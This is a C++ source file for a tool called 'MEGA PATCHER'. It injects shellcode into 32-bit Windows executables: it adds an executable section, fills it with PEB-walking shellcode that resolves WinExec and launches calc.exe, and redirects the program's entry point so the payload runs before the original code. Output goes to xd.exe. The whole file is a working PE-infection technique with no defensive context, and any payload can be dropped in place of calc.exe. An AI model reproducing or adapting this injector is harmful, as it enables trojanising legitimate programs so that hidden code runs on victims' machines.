#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <winnt.h>

#include <cstdlib>
#include <iostream>
#include <fstream>
#include "pe_lib/pe_bliss.h"


char code[] =
"\x55" 
"\x89\xe5"
"\x83\xec\x20" 
"\x31\xdb" 
"\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53"
"\xff\xd0"
"\x90\x90"
"\x31\xC0\x89\xEC\x5D\xC3";

char jmp_and_call[] =
"\xE8\x0A\x00\x00\x00" //call next procedure (+9 bytes)
"\x90\x90\x90\x90\x90" // junk nop
"\xE9\xFF\xFF\xFF\xFF" // jmp to main
;

using namespace pe_bliss;

int main(int argc, const char** argv)
{
	SetConsoleTitle("MEGA PATCHER (only for x86)");
	if(argc != 2)
	{
		std::cout << "Use patcher.exe <file_to_patch>\n";
		return 0;
	}

	std::ifstream pe_file(argv[1], std::ios::in | std::ios::binary);
	
	if(!pe_file)
	{
		std::cout << "Can't find PE file\n";
		return 0;
	}

	
	try
	{
		pe_base image(pe_factory::create_pe(pe_file));
		if(image.get_pe_type() == pe_type_64)
		{
			std::cout << "Patches only for x86 files!" << std::endl;
			return 0;
		}

		section patch_section;
		patch_section.set_name(".patch");
		patch_section.readable(true).writeable(true).executable(true);
		patch_section.get_raw_data().resize(512);
		section& attached_section = image.add_section(patch_section);
		//Calc offset to EP

		uint32_t jmp_offset = image.rva_to_va_32(image.get_ep()) - (image.rva_to_va_32(attached_section.get_virtual_address()) + 0xF) /*10 bytes of call & nop code*/;
		//Write jmp offset
		memcpy_s(&jmp_and_call[11], 4, &jmp_offset, 4);

		//Write all data
		attached_section.set_raw_data(
			std::string(jmp_and_call, sizeof(jmp_and_call) - 1) + //write call and jmp
			std::string(code, sizeof(code) - 1) //write shell
		);
		attached_section.get_raw_data().resize(512);
		image.set_ep(attached_section.get_virtual_address());
		import_rebuilder_settings settings(true, false);
		
		std::ofstream patch_file("xd.exe", std::ios::out | std::ios::binary | std::ios::trunc);
		rebuild_pe(image, patch_file);
		patch_file.close();
	}
	catch(const pe_exception& e)
	{
		std::cout << "Patcher exception: " << e.what() << std::endl;
	}

	return 0;
	
}